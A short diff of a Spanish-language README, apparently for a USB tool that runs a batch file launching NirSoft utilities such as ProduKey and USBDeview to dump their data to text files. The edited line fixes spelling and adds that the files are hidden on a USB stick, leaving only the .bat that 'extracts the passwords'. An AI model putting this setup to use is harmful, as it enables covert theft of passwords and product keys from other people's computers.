@@ -40,7 +40,7 @@ start ProduKey.exe /stext ProduKey.txt
 start USBDeview.exe /stext USBDeview.txt
 ```
 
-Por ultimo solo copia los archivos descagados y ocultalos en alguna usb, solo dejando el .Bat
+Por último solo copia los archivos descargados y ocúltalos en alguna usb, solo dejando el .Bat que es el que ejecutarás para poder extraer las contraseñas
 
 ## 📚 Nota Importante
 Algo a destacar es que todos los archivos deben estar en una misma carpeta, incluyendo el ".Bat" De lo contrario no funcionará.
